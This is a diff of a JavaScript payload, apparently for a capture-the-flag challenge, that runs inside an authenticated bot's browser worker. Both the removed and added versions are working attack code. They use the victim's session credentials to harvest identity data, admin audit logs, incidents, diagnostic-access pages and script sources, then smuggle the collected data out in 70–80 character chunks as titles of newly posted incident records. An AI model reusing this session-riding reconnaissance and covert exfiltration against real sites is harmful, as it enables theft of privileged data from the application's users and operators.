@@ -1,164 +1,112 @@
 
 (async () => {
-    const ORIGIN = self.location.origin;
-
-    self.postMessage({
-        type: "progress",
-        message: "BOTLOG: Starting authenticated session inspection"
-    });
-
-    async function get(path) {
-        try {
-            const response = await fetch(
-                new URL(path, ORIGIN).href,
-                {
-                    credentials: "include",
-                    cache: "no-store"
-                }
-            );
-
-            const raw = await response.text();
-
-            let body;
-            try {
-                body = JSON.parse(raw);
-            } catch {
-                body = raw;
-            }
-
-            return {
-                status: response.status,
-                body
-            };
-        } catch (e) {
-            return { error: String(e) };
-        }
-    }
-
-    const report = {
-        timestamp: new Date().toISOString(),
-        endpoints: {}
+    const get = async path => {
+        const r = await fetch(path, { credentials: "same-origin" });
+        return { status: r.status, text: await r.text() };
     };
 
-    // Current authenticated bot identity
-    report.endpoints.me = await get("/api/me");
+    const meResponse = await get("/api/me");
+    let me;
+    try { me = JSON.parse(meResponse.text).user; } catch {}
 
-    // Audit records
-    report.endpoints.audit = await get(
-        "/api/admin/audit?limit=25"
-    );
+    const report = {
+        identity: me ? {
+            id: me.id,
+            role: me.role,
+            verified: me.verified,
+            email: me.email
+        } : meResponse,
+        pages: [],
+        sources: []
+    };
 
-    // Incident records
-    report.endpoints.incidents = await get("/api/incidents");
+    const paths = [
+        "/diagnostic-access/requests",
+        "/diagnostic-access/requests/6",
+        "/diagnostic-access/requests/new",
+        "/diagnostic-access/profiles",
+        "/diagnostic-access/profiles/6/edit",
+        "/diagnostic-access/profiles/new",
+        "/developer"
+    ];
 
-    // Escalation records
-    report.endpoints.escalations = await get("/api/escalations");
+    const assets = new Set([
+        "/js/api-client.js",
+        "/js/app.js",
+        "/js/link-analyzer.js",
+        "/js/link-analyzer-worker.js"
+    ]);
 
-    self.postMessage({
-        type: "progress",
-        message: "BOTLOG: Initial records collected"
-    });
+    for (const path of paths) {
+        const { status, text: html } = await get(path);
 
-    // Retrieve individual audit entry details
-    const auditBody = report.endpoints.audit.body;
-    const entries = auditBody?.entries || [];
+        const title = html.match(/<title[^>]*>(.*?)<\/title>/i)?.[1];
 
-    report.auditDetails = [];
+        const links = [...html.matchAll(
+            /href=["']([^"']+)["']/gi
+        )].map(m => m[1]);
 
-    for (const entry of entries.slice(0, 20)) {
-        const detail = await get(
-            "/api/admin/audit?log=" +
-            encodeURIComponent(entry.id)
-        );
+        const scripts = [...html.matchAll(
+            /<script[^>]+src=["']([^"']+)["']/gi
+        )].map(m => m[1]);
 
-        report.auditDetails.push({
-            id: entry.id,
-            detail
+        scripts.forEach(s => {
+            if (s.startsWith("/")) assets.add(s);
+        });
+
+        const forms = [...html.matchAll(
+            /<form\b[\s\S]*?<\/form>/gi
+        )].map(m => m[0].replace(/\s+/g, " ").slice(0, 1000));
+
+        report.pages.push({
+            path,
+            status,
+            title,
+            links: links.filter(x =>
+                /diagnostic|log|access|developer|monitor/i.test(x)
+            ),
+            forms
         });
     }
 
-    // Extract useful incident information
-    const incidentBody = report.endpoints.incidents.body;
+    for (const src of assets) {
+        try {
+            const { status, text: js } = await get(src);
 
-    if (incidentBody?.incidents) {
-        report.incidentHighlights =
-            incidentBody.incidents
-                .filter(i =>
-                    /BOT|CyCTF|flag|password|developer|PWN/i.test(
-                        i.title || ""
-                    )
+            const matches = js.split("\n")
+                .map((line, i) => `${i + 1}: ${line.trim()}`)
+                .filter(line =>
+                    /diagnostic|log|audit|support|bundle|master|pwn|flag|api\//i.test(line)
                 )
-                .map(i => ({
-                    id: i.id,
-                    code: i.code,
-                    title: i.title,
-                    created_by: i.created_by
-                }));
+                .slice(0, 35);
+
+            report.sources.push({ src, status, matches });
+        } catch (e) {
+            report.sources.push({ src, error: String(e) });
+        }
     }
 
-    // Serialize report
-    const serialized = JSON.stringify(report);
+    const output = JSON.stringify(report, null, 2).slice(0, 6500);
 
-    const chunkSize = 70;
-    const total = Math.ceil(serialized.length / chunkSize);
-
-    self.postMessage({
-        type: "progress",
-        message: `BOTLOG: Sending ${total} chunks`
-    });
-
-    // Send results through incident titles
-    for (let i = 0; i < total; i++) {
-        const chunk = serialized.slice(
-            i * chunkSize,
-            (i + 1) * chunkSize
-        );
-
+    for (let i = 0; i < output.length; i += 80) {
         const title =
-            `BOTLOG-${String(i + 1).padStart(3, "0")}:${chunk}`;
+            `MMINFO-${String(i / 80 + 1).padStart(3, "0")}:` +
+            output.slice(i, i + 80);
 
-        const response = await fetch(
-            new URL("/api/incidents", ORIGIN).href,
-            {
-                method: "POST",
-                credentials: "include",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    title,
-                    facility: "Meridian-2",
-                    severity: "Watch"
-                })
-            }
-        );
-
-        const result = await response.json();
-
-        if (!response.ok || result.ok === false) {
-            throw new Error(
-                `Chunk ${i + 1} failed: ${JSON.stringify(result)}`
-            );
-        }
-
-        if ((i + 1) % 5 === 0) {
-            self.postMessage({
-                type: "progress",
-                message: `BOTLOG: Uploaded ${i + 1}/${total}`
-            });
-        }
-
-        await new Promise(resolve => setTimeout(resolve, 100));
+        await fetch("/api/incidents", {
+            method: "POST",
+            credentials: "same-origin",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                title,
+                facility: "Meridian-2",
+                severity: "Watch"
+            })
+        });
     }
 
     self.postMessage({
         type: "progress",
-        message: `BOTLOG_UPLOAD_COMPLETE:${total}`
+        message: "MASTER MIND RECON COMPLETE"
     });
-
-})().catch(error => {
-    self.postMessage({
-        type: "progress",
-        message: "BOTLOG_ERROR: " + String(error)
-    });
-});
+})();
